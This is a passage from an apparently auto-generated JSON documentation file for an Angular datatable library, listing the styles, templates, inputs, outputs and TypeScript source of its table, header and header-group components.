  }\n\n    &__row {\n      display: flex;\n      position: relative;\n      align-items: center;\n      outline: none;\n\n      &--selected {\n        box-shadow: -1px 1px 0px 0px rgba(0, 0, 0, .26) inset, 1px -1px 0px 0 rgba(0, 0, 0, .26) inset\n      }\n\n\n      &__cell {\n        flex: 1 0 50px;\n        overflow: hidden;\n        text-align: left;\n        padding: 0 $datatable-horizontal-padding;\n        position: relative;\n        vertical-align: middle;\n        box-sizing: border-box;\n        transition: flex-basis 100ms linear;\n\n        span {\n          overflow: hidden;\n          white-space: nowrap;\n          text-overflow: ellipsis;\n          display: block;\n        }\n      }\n    }\n  }\n\n  &__body--empty {\n    margin: 8px;\n  }\n\n  &__body--no-vscroll {\n    overflow-y: auto;\n  }\n}\n\n\nsto-datatable {\n  display: block;\n}\n\nsto-datatable .cdk-virtual-scroll-content-wrapper {\n  position: static;\n}\n\n.sto-card.sto-card--table {\n  sto-datatable {\n    margin: 0 -8px;\n\n    .sto-mdl-table__header__row__cell, .sto-mdl-table__body__row__cell, .sto-mdl-table__footer__row__cell {\n      &:first-of-type {\n        margin-left: 8px;\n      }\n\n      &:last-of-type {\n        margin-right: 8px;\n      }\n    }\n  }\n}\n\n\n",
          "styleUrl": "./sto-datatable.component.scss"
        },
        {
          "data": ".sto-mdl-table {\n  &__progress-bar {\n    display: block;\n    width: 100%;\n    height: 5px;\n    padding: 0;\n    margin: -5px 0 0 0;\n    position: absolute;\n\n    &__container {\n      display: block;\n      position: relative;\n      overflow: hidden;\n      width: 100%;\n      height: 5px;\n      -webkit-transform: translate(0, 0) scale(1, 1);\n      transform: translate(0, 0) scale(1, 1);\n      background-color: rgb(170, 209, 249);\n\n      &__bar {\n        transition: all .2s linear;\n        -webkit-animation: query .8s infinite cubic-bezier(.39, .575, .565, 1);\n        animation: query .8s infinite cubic-bezier(.39, .575, .565, 1);\n\n        transition: -webkit-transform .2s linear;\n        transition: transform .2s linear;\n        background-color: rgb(16, 108, 200);\n\n        position: absolute;\n        left: 0;\n        top: 0;\n        bottom: 0;\n        width: 100%;\n        height: 5px;\n      }\n    }\n  }\n\n  /**\n   * Progress bar animations\n   */\n  @keyframes query {\n    0% {\n      opacity: 1;\n      transform: translateX(35%) scale(.3, 1);\n    }\n\n    100% {\n      opacity: 0;\n      transform: translateX(-50%) scale(0, 1);\n    }\n  }\n\n}\n",
          "styleUrl": "./sto-datatable-progress-bar.scss"
        }
      ],
      "stylesData": "",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "elRef",
            "type": "ElementRef",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "cdr",
            "type": "ChangeDetectorRef",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "zone",
            "type": "NgZone",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 257,
        "jsdoctags": [
          {
            "name": "elRef",
            "type": "ElementRef",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "cdr",
            "type": "ChangeDetectorRef",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "zone",
            "type": "NgZone",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "implements": [
        "AfterViewInit",
        "OnDestroy"
      ],
      "accessors": {
        "height": {
          "name": "height",
          "setSignature": {
            "name": "height",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "height",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 44,
            "jsdoctags": [
              {
                "name": "height",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "height",
            "type": "",
            "returnType": "",
            "line": 40
          }
        },
        "bodyHeight": {
          "name": "bodyHeight",
          "getSignature": {
            "name": "bodyHeight",
            "type": "",
            "returnType": "",
            "line": 51
          }
        },
        "rows": {
          "name": "rows",
          "setSignature": {
            "name": "rows",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "rows",
                "type": "T[]",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 71,
            "jsdoctags": [
              {
                "name": "rows",
                "type": "T[]",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "rows",
            "type": "",
            "returnType": "",
            "line": 94
          }
        },
        "footerRow": {
          "name": "footerRow",
          "setSignature": {
            "name": "footerRow",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "row",
                "type": "any",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 109,
            "jsdoctags": [
              {
                "name": "row",
                "type": "any",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "footerRow",
            "type": "",
            "returnType": "",
            "line": 99
          }
        },
        "columnMode": {
          "name": "columnMode",
          "setSignature": {
            "name": "columnMode",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "columnMode",
                "type": "ColumnDisplay",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 118,
            "jsdoctags": [
              {
                "name": "columnMode",
                "type": "ColumnDisplay",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "columnMode",
            "type": "",
            "returnType": "ColumnDisplay",
            "line": 114
          }
        },
        "columns": {
          "name": "columns",
          "setSignature": {
            "name": "columns",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "columns",
                "type": "Column[]",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 127,
            "jsdoctags": [
              {
                "name": "columns",
                "type": "Column[]",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "columns",
            "type": "[]",
            "returnType": "Column[]",
            "line": 123
          }
        },
        "width": {
          "name": "width",
          "getSignature": {
            "name": "width",
            "type": "",
            "returnType": "",
            "line": 143
          }
        },
        "resizeable": {
          "name": "resizeable",
          "setSignature": {
            "name": "resizeable",
            "type": "void",
            "deprecated": false,
            "deprecationMessage": "",
            "args": [
              {
                "name": "resizeable",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "returnType": "void",
            "line": 243,
            "jsdoctags": [
              {
                "name": "resizeable",
                "type": "boolean",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          "getSignature": {
            "name": "resizeable",
            "type": "boolean",
            "returnType": "boolean",
            "line": 239
          }
        }
      },
      "templateData": "<div class=\"sto-mdl-table\"\n     [class.sto-mdl-table--force-width]=\"columnMode === ColumnDisplay.Force\"\n     [style.height.px]=\"height$ | async\">\n  <ng-content select=\"sto-datatable-actions\"></ng-content>\n  <sto-datatable-header-group *ngIf=\"(!responsive || (responsive && !(smallScreen))) && columnGroups && this.scrollbarH\"\n                              [width]=\"width\"\n                              [height]=\"headerHeight\"\n                              [transform]=\"scrollLeft\"\n                              [columns]=\"columns\"\n                              [groups]=\"columnGroups\"></sto-datatable-header-group>\n  <sto-datatable-header [responsive]=\"responsive\"\n                        [groups]=\"groups\"\n                        [columnMode]=\"columnMode\"\n                        (resized)=\"onResize($event)\"\n                        [resizeable]=\"resizeable && scrollbarH\"\n                        [smallScreen]=\"smallScreen\"\n                        [headerHeight]=\"headerHeight\"\n                        [offset]=\"bodyHeight && rowTotalHeight > bodyHeight ? 12 : 0\"\n                        [width]=\"width\"\n                        [scrollLeft]=\"scrollLeft\"\n                        [bodyHeight]=\"bodyHeight\"\n                        [rows]=\"rows\"\n                        [rowHeight]=\"rowHeight\"\n                        [columns]=\"columns\"\n                        [sortable]=\"sortable\"\n                        (sort)=\"sort($event)\"\n                        (headerContextMenu)=\"headerContextMenu.emit($event)\"></sto-datatable-header>\n  <div class=\"sto-mdl-table__progress-bar\"\n       *ngIf=\"loading\"\n       role=\"progressbar\">\n    <div class=\"sto-mdl-table__progress-bar__container\">\n      <div class=\"sto-mdl-table__progress-bar__container__bar\"></div>\n    </div>\n  </div>\n  <div class=\"sto-mdl-table__body--empty\"\n       *ngIf=\"!rows || rows.length === 0\">\n    {{ emptyMessage }}\n  </div>\n  <sto-datatable-body #body\n                      [disableRipple]=\"disableRipple || select.observers.length === 0\"\n                      [columnMode]=\"columnMode\"\n                      [width]=\"scrollbarH ? columnTotalWidth + 'px' : 'auto'\"\n                      [selectable]=\"!!select.observers.length\"\n                      [rows]=\"rows\"\n                      [rowClass]=\"rowClass\"\n                      [scrollLeft]=\"scrollbarH && footerRow ? scrollLeft : null\"\n                      [selectionMode]=\"selectionMode\"\n                      [scrollbarH]=\"footerRow ? false : scrollbarH\"\n                      [trackBy]=\"trackBy\"\n                      [virtualScroll]=\"virtualScroll\"\n                      [height]=\"bodyHeight\"\n                      [rowHeight]=\"rowHeight\"\n                      (rowContextMenu)=\"rowContextMenu.emit($event)\"\n                      (activate)=\"rowActivate.emit($event)\"\n                      (rowSelected)=\"select.emit($event)\"\n                      [columns]=\"columns\"\n                      (scrollHeader)=\"setHeaderScroll($event)\"\n                      [responsive]=\"responsive\"\n                      [responsiveView]=\"responsiveView\"\n                      [smallView]=\"smallScreen\"\n                      [hasFooter]=\"!!footerRow\"\n                      [selected]=\"selected\"></sto-datatable-body>\n  <div class=\"sto-mdl-table__footer\"\n       [style.overflowY]=\"'hidden'\"\n       [style.overflowX]=\"'auto'\"\n       (scroll)=\"scrollBodyAndHeader($event)\"\n       [style.width]=\"'calc(100% - ' + body.verticalScrollOffset + 'px)'\"\n       *ngIf=\"footerRow && (!responsive || (responsive && !(smallScreen)))\">\n    <div class=\"sto-mdl-table__footer__row\"\n         [class.sto-mdl-table__row--scroll-offset]=\"scrollbarH && !!bodyHeight && (rows?.length || 1) * rowHeight > bodyHeight\"\n         *ngFor=\"let row of footerRow; let i = index\"\n         [style.min-width]=\"width\"\n         [style.overflowY]=\"'hidden'\"\n         [style.height]=\"rowHeight + 'px'\">\n      <div class=\"sto-mdl-table__footer__row__cell\"\n           [ngStyle]=\"column | columnStyle:columnMode\"\n           *ngFor=\"let column of columns; trackBy: trackColumnsFn\">\n        <span *ngIf=\"!column.footerTemplate\">\n          {{ row[column.prop] }}\n        </span>\n        <ng-template #footerTemplate\n                     *ngIf=\"column.footerTemplate\"\n                     [ngTemplateOutlet]=\"column.footerTemplate\"\n                     [ngTemplateOutletContext]=\"{column: column, value: row[column.prop], index: i}\">\n        </ng-template>\n      </div>\n    </div>\n  </div>\n</div>\n<ng-content select=\"mat-paginator\"></ng-content>\n\n"
    },
    {
      "name": "StoDatatableHeaderComponent",
      "id": "component-StoDatatableHeaderComponent-c0d1e689d43c5c9eab8865baa1a71397602eff6bb74a1659de5fda0604ba7d343979b095ee7cbd1be2426e99050ffb571dcd5a9732c2648c45b2e9733433c4f9",
      "file": "libs/datatable/src/lib/sto-datatable/sto-datatable-header/sto-datatable-header.component.ts",
      "changeDetection": "ChangeDetectionStrategy.OnPush",
      "encapsulation": [],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-datatable-header",
      "styleUrls": [
        "./sto-datatable-header.component.scss"
      ],
      "styles": [],
      "templateUrl": [
        "./sto-datatable-header.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "bodyHeight",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 35,
          "type": "number | null",
          "decorators": []
        },
        {
          "name": "columnMode",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 45,
          "type": "ColumnDisplay",
          "decorators": []
        },
        {
          "name": "columns",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 41,
          "type": "Column[]",
          "decorators": []
        },
        {
          "name": "groups",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 47,
          "type": "Array<Group>",
          "decorators": []
        },
        {
          "name": "headerHeight",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 19,
          "type": "number",
          "decorators": []
        },
        {
          "name": "offset",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 25,
          "type": "number",
          "decorators": []
        },
        {
          "name": "resizeable",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 21,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "responsive",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 15,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "rowHeight",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 39,
          "type": "number",
          "decorators": []
        },
        {
          "name": "rows",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 37,
          "type": "T[]",
          "decorators": []
        },
        {
          "name": "scrollLeft",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 27,
          "type": "string",
          "decorators": []
        },
        {
          "name": "smallScreen",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 17,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "sortable",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 43,
          "type": "boolean",
          "decorators": []
        },
        {
          "name": "width",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 23,
          "type": "string",
          "decorators": []
        }
      ],
      "outputsClass": [
        {
          "name": "headerContextMenu",
          "defaultValue": "new EventEmitter<HeaderContextMenu>()",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 61,
          "type": "EventEmitter"
        },
        {
          "name": "resized",
          "defaultValue": "new EventEmitter<{ columns: Column[], column: Column }>()",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 55,
          "type": "EventEmitter"
        },
        {
          "name": "sort",
          "defaultValue": "new EventEmitter<Sort>()",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 63,
          "type": "EventEmitter"
        }
      ],
      "propertiesClass": [
        {
          "name": "ColumnDisplay",
          "defaultValue": "ColumnDisplay",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "",
          "line": 49
        },
        {
          "name": "headerWidthMap",
          "defaultValue": "{}",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Record<number | number>",
          "optional": false,
          "description": "",
          "line": 52,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "sortDirection",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "\"asc\" | \"desc\" | null",
          "optional": false,
          "description": "",
          "line": 57,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "tempWidth",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string | null",
          "optional": false,
          "description": "",
          "line": 50,
          "modifierKind": [
            123
          ]
        }
      ],
      "methodsClass": [
        {
          "name": "_onResize",
          "args": [
            {
              "name": "column",
              "type": "Column",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "flexBasis",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 102,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            123
          ],
          "jsdoctags": [
            {
              "name": "column",
              "type": "Column",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "flexBasis",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "onResize",
          "args": [
            {
              "name": "event",
              "type": "CdkDragMove<Column>",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 69,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "event",
              "type": "CdkDragMove<Column>",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "onResizeComplete",
          "args": [
            {
              "name": "event",
              "type": "CdkDragEnd<Column>",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 79,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "event",
              "type": "CdkDragEnd<Column>",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "onResizeEnd",
          "args": [
            {
              "name": "col",
              "type": "Column",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "flexBasis",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 118,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "col",
              "type": "Column",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "flexBasis",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "sortColumn",
          "args": [
            {
              "name": "sortEvent",
              "type": "Sort",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 135,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "sortEvent",
              "type": "Sort",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "trackColumnsFn",
          "args": [
            {
              "name": "index",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "item",
              "type": "Column",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "any",
          "typeParameters": [],
          "line": 65,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            123
          ],
          "jsdoctags": [
            {
              "name": "index",
              "type": "number",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "item",
              "type": "Column",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
      "sourceCode": "import { ChangeDetectionStrategy, Component, EventEmitter, Input, Output } from '@angular/core';\nimport { Column, ColumnDisplay, Group } from '../columns';\nimport { HeaderContextMenu } from '../events';\nimport { Sort } from '@angular/material/sort';\nimport { CdkDragEnd, CdkDragMove } from '@angular/cdk/drag-drop';\n\n@Component({\n  selector: 'sto-datatable-header',\n  templateUrl: './sto-datatable-header.component.html',\n  styleUrls: ['./sto-datatable-header.component.scss'],\n  changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class StoDatatableHeaderComponent<T = Record<string, unknown>> {\n  @Input()\n  responsive: boolean;\n  @Input()\n  smallScreen: boolean;\n  @Input()\n  headerHeight: number;\n  @Input()\n  resizeable: boolean;\n  @Input()\n  width: string;\n  @Input()\n  offset: number;\n  @Input()\n  scrollLeft: string;\n\n  // Can be used to generate sticky columns at a later stage.\n  get offsetLeft() {\n    return this.scrollLeft.replace('-', '');\n  }\n\n  @Input()\n  bodyHeight: number | null;\n  @Input()\n  rows: T[];\n  @Input()\n  rowHeight: number;\n  @Input()\n  columns: Column[];\n  @Input()\n  sortable: boolean;\n  @Input()\n  columnMode: ColumnDisplay;\n  @Input()\n  groups: Array<Group>;\n\n  ColumnDisplay = ColumnDisplay;\n  public tempWidth: string | null;\n\n  public headerWidthMap: Record<number, number> = {};\n\n  @Output()\n  resized = new EventEmitter<{ columns: Column[], column: Column }>();\n\n  public sortDirection: 'asc' | 'desc' | null;\n\n\n  @Output()\n  headerContextMenu = new EventEmitter<HeaderContextMenu>();\n  @Output()\n  sort = new EventEmitter<Sort>();\n\n  public trackColumnsFn(index: number, item: Column) {\n    return item.$$id;\n  }\n\n  onResize(event: CdkDragMove<Column>) {\n    const el = event.source.element.nativeElement;\n    const cell = el.parentElement as HTMLDivElement;\n    const distance = event.distance.x;\n    const def = event.source.data;\n    let flexBasis = ( def.flexBasis ?? 80 ) + distance;\n    flexBasis = flexBasis < 80 ? 80 : flexBasis;\n    cell.style.flexBasis = `${flexBasis}px`;\n  }\n\n  onResizeComplete(event: CdkDragEnd<Column>) {\n    const distance = event.distance.x;\n    const col = event.source.data;\n    const cell = event.source.element.nativeElement.parentElement as HTMLDivElement;\n    let flexBasis = ( col.flexBasis ?? 80 ) + distance;\n    if ( col.flexGrow || col.flexBasis ) {\n      flexBasis = cell.clientWidth;\n    }\n    flexBasis = flexBasis < 80 ? 80 : flexBasis;\n    const columns = this.columns\n      .map(c => {\n        if ( c.prop === col.prop ) {\n          return {\n            ...c,\n            flexBasis, flexGrow: 0, flexShrink: 0\n          };\n        }\n        return c;\n      });\n    const column = { ...col, flexBasis, flexGrow: 0, flexShrink: 0 };\n    this.resized.emit({ columns, column });\n  }\n\n  public _onResize(column: Column, flexBasis: number): void {\n    const width = 0;\n    const colIndex = this.columns.indexOf(column);\n    this.headerWidthMap[ colIndex ] = flexBasis;\n    /*    const cols = this.columns\n          .map(c => {\n            if ( c === column ) {\n              c.flexBasis = flexBasis;\n            }\n            width = width + c.flexBasis;\n            return c;\n          });*/\n    this.tempWidth = ( this.offset + width ) + 'px';\n    // this.columns = [...cols];\n  }\n\n  onResizeEnd(col: Column, flexBasis: number) {\n    // this.onResize(column, flexBasis);\n    const columns = this.columns\n      .map(c => {\n        if ( c === col ) {\n          return {\n            ...c,\n            flexBasis\n          };\n        }\n        return c;\n      });\n    this.tempWidth = null;\n    const column = { ...col, flexBasis };\n    this.resized.emit({ columns, column });\n  }\n\n  sortColumn(sortEvent: Sort) {\n    this.sort.emit(sortEvent);\n  }\n}\n",
      "assetsDirs": [],
      "styleUrlsData": [
        {
          "data": ".sto-mdl-table__header__row__cell {\n  display: flex;\n  align-items: center;\n  font-weight: 700;\n\n  &--sortable {\n    cursor: pointer;\n  }\n\n  .mat-icon {\n    font-size: 16px;\n    line-height: 24px;\n    margin-right: 8px;\n  }\n\n  span {\n    min-width: 0;\n    overflow: hidden;\n    white-space: nowrap;\n    text-overflow: ellipsis;\n  }\n}\n\n.col-resizer {\n  display: inline-block;\n  width: 1px;\n  height: 32px;\n  margin-right: -6px;\n  border-left: 6px solid transparent;\n  border-right: 4px solid transparent;\n  cursor: move;\n  transform: none !important;\n\n  &__drag {\n    width: 2px;\n    height: 32px;\n    background-color: var(--divider);\n  }\n}\n",
          "styleUrl": "./sto-datatable-header.component.scss"
        }
      ],
      "stylesData": "",
      "accessors": {
        "offsetLeft": {
          "name": "offsetLeft",
          "getSignature": {
            "name": "offsetLeft",
            "type": "",
            "returnType": "",
            "line": 30
          }
        }
      },
      "templateData": "<div class=\"sto-mdl-table__header\"\n     [style.overflow-y]=\"'hidden'\"\n     [style.overflowX]=\"'hidden'\"\n     *ngIf=\"!responsive || (responsive && !smallScreen)\">\n  <div class=\"sto-mdl-table__header__row sto-mdl-table__header__group__row\"\n       *ngIf=\"groups && groups.length > 0\"\n       [style.display]=\"columnMode === ColumnDisplay.Flex ? 'flex' : 'block'\"\n       [style.height]=\"headerHeight + 'px'\"\n       [style.min-width]=\"tempWidth || width\"\n       [style.transform]=\"scrollLeft\"\n       [style.overflow]=\"'hidden'\"\n       [class.sto-mdl-table__row--scroll-offset]=\"!!bodyHeight && (rows?.length || 1) * rowHeight > bodyHeight\">\n    <div class=\"sto-mdl-table__header__row__cell sto-mdl-table__header__group__row__cell\"\n         [style.flex]=\"group | getGroupFlex:columns\"\n         *ngFor=\"let group of groups; let i = index;\">\n      <span class=\"sto-mdl-table__header__row__cell__content\">{{ group.name || '' }}</span>\n    </div>\n  </div>\n\n  <div class=\"sto-mdl-table__header__row\"\n       matSort\n       (matSortChange)=\"sortColumn($event)\"\n       [matSortDisabled]=\"!sortable\"\n       (dragover)=\"$event.preventDefault()\"\n       [style.display]=\"columnMode === ColumnDisplay.Flex ? 'flex' : 'block'\"\n       [style.height]=\"headerHeight + 'px'\"\n       [style.min-width]=\"tempWidth || width\"\n       [style.transform]=\"scrollLeft\"\n       [style.overflow]=\"'hidden'\"\n       [class.sto-mdl-table__row--scroll-offset]=\"!!bodyHeight && (rows?.length || 1) * rowHeight > bodyHeight\">\n    <div class=\"sto-mdl-table__header__row__cell\"\n         (click)=\"sortHeader._handleClick()\"\n         (contextmenu)=\"headerContextMenu.emit({event: $event, column: column})\"\n         [class.sto-mdl-table__header__row__cell--sortable]=\"sortable && !column.disableSort\"\n         [ngClass]=\"column.headerClass | exec:column\"\n         [ngStyle]=\"column | columnStyle:columnMode\"\n         *ngFor=\"let column of columns; let i = index; trackBy: trackColumnsFn\">\n      <div [mat-sort-header]=\"column.$$id\"\n           class=\"sto-mdl-table__header__row__cell__label\"\n           (click)=\"$event.stopPropagation()\"\n           #sortHeader\n           [arrowPosition]=\"column.sortArrowPosition || 'after'\"\n           [disabled]=\"column.disableSort\">\n        <span *ngIf=\"!column.headerTemplate\"\n              class=\"sto-mdl-table__header__row__cell__content\"\n              [title]=\"column.name\">{{ column.name || '' }}</span>\n        <ng-template #headerTemplate\n                     *ngIf=\"column.headerTemplate\"\n                     [ngTemplateOutlet]=\"column.headerTemplate\"\n                     [ngTemplateOutletContext]=\"{column: column}\">\n        </ng-template>\n      </div>\n      <span class=\"spacer\"></span>\n      <div [style.height.px]=\"headerHeight\"\n           *ngIf=\"resizeable && !column.disableResize\"\n           class=\"col-resizer\"\n           (click)=\"$event.stopPropagation();\"\n           [cdkDragData]=\"column\"\n           (cdkDragMoved)=\"onResize($event)\"\n           (cdkDragEnded)=\"onResizeComplete($event)\"\n           cdkDragLockAxis=\"x\"\n           cdkDrag>\n        <div class=\"col-resizer__drag\"\n             [style.height.px]=\"headerHeight\"></div>\n      </div>\n    </div>\n  </div>\n</div>\n"
    },
    {
      "name": "StoDatatableHeaderGroupComponent",
      "id": "component-StoDatatableHeaderGroupComponent-b44434b003ab731bd020a182b31fed272e3cd6171623ac88d040730087ebddebdbb957abc7b721a690bad230e1f3c117b3727a75efb5c62074f5199e96707276",
      "file": "libs/datatable/src/lib/sto-datatable/sto-datatable-header-group/sto-datatable-header-group.component.ts",
      "changeDetection": "ChangeDetectionStrategy.OnPush",
      "encapsulation": [],
      "entryComponents": [],
      "inputs": [],
      "outputs": [],
      "providers": [],
      "selector": "sto-datatable-header-group",
      "styleUrls": [
        "./sto-datatable-header-group.component.scss"
      ],
      "styles": [],
      "templateUrl": [
        "./sto-datatable-header-group.component.html"
      ],
      "viewProviders": [],
      "inputsClass": [
        {
          "name": "columns",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 20,
          "type": "Column[]",
          "decorators": []
        },
        {
          "name": "groups",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 12,
          "type": "ColumnGroup[]",
          "decorators": []
        },
        {
          "name": "height",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 14,
          "type": "number",
          "decorators": []
        },
        {
          "name": "transform",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 18,
          "type": "string",
          "decorators": []
        },
        {
          "name": "width",
          "deprecated": false,
          "deprecationMessage": "",
          "line": 16,
          "type": "string",
          "decorators": []
        }
      ],
      "outputsClass": [],
      "propertiesClass": [],
      "methodsClass": [
        {
          "name": "ngOnChanges",
          "args": [
            {
              "name": "changes",
              "type": "SimpleChanges",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "void",
          "typeParameters": [],
          "line": 33,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "changes",
              "type": "SimpleChanges",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        {
          "name": "testOffset",
          "args": [
            {
              "name": "group",
              "type": "ColumnGroup",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "optional": false,
          "returnType": "string",
          "typeParameters": [],
          "line": 22,
          "deprecated": false,
          "deprecationMessage": "",
          "jsdoctags": [
            {
              "name": "group",
              "type": "ColumnGroup",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "deprecated": false,
      "deprecationMessage": "",
      "hostBindings": [],
      "hostListeners": [],
      "description": "",
      "rawdescription": "\n",
      "type": "component",
